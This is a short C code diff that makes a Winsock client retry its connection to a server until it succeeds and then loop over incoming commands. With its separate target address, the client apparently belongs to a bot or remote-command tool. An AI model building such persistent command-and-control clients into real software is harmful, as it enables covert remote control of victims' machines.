@@ -32,9 +32,14 @@ int main() {
     target_addr.ip = TARGET_IP;
     target_addr.port = 80;
 
+    // setting up connection to server
+    // if the server isn't up yet, then it will keey trying to connect until it's successful
     startWinsock(&wsaData);
     server_socket = startSocket();
-    connectSocket(&serv_addr, server_socket, server_ip);
+    while (connectSocket(&serv_addr, server_socket, server_ip) != 1){
+        printf("Waiting for connection...");
+        Sleep(1000);
+    }
 
     while (1) {
         memset(cmd_buf, 0, 1024);
